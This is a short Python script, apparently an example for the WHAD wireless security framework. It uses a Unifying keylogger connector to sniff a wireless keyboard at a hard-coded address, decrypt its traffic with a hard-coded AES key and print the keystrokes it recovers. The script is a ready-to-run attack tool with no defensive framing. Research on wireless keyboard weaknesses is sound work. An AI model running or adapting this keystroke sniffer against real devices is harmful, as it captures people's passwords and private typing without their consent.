from whad.unifying import Keylogger
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
import sys,time

def show(pkt):
    print(repr(pkt))

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        # Retrieve target interface
        interface = sys.argv[1]

        # Connect to target device and performs discovery
        try:
            dev = WhadDevice.create(interface)

            connector = Keylogger(dev)
            connector.address = "9b:0a:90:42:90"
            connector.scanning = True
            connector.decrypt = True

            connector.add_key(bytes.fromhex("08f59b42c56f433e8b888d4d5bde40fc"))
            connector.start()
            out = ""
            for i in connector.key_stream():
                out += i
                print(out)

        except (KeyboardInterrupt, SystemExit):
            dev.close()

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)
    else:
        print('Usage: %s [device]' % sys.argv[0])
